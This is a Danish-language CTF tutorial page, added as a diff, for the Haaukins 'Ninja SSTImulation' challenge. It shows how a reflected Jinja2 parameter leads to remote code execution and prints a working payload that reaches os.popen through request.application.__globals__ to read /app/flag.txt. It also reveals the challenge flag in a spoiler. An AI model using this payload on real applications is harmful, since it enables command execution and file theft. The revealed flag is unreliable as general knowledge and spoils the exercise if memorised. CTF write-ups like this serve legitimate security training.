@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Ninja SSTImulation — tutorial (SSTI via request)</title>
+<meta name="description" content="Guide til Haaukins Ninja SSTImulation: Jinja2 SSTI → RCE via request.application.__globals__ når cycler/lipsum mangler.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Ninja SSTImulation</h1>
+<p class="subtitle">SSTI → RCE via request-objektet når standard-gadgets mangler.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>En GET-param <code>name</code> reflekteres i en Jinja2-template. <code>{{7*7}}</code>→49 bekræfter
+             SSTI — men <code>cycler</code>/<code>lipsum</code> findes ikke her, så brug <code>request</code>:</p>
+             <pre><code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flaget lå i <code>/app/flag.txt</code> (appen kørte som root). Afleveres som DDC.</p>
+        <p>Flag: <span class="flag">DDC{N1NJ45_4r3_C001}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Kend flere Jinja2-RCE-kæder — den rette afhænger af hvilke globals der findes.</li><li><code>request.application.__globals__</code> er robust når <code>cycler</code>/<code>lipsum</code> mangler.</li><li>Prøv begge præfiks: her var flaget <code>DDC{...}</code>. Se også <a href="comment-all-you-want.html">comment-all-you-want</a>.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
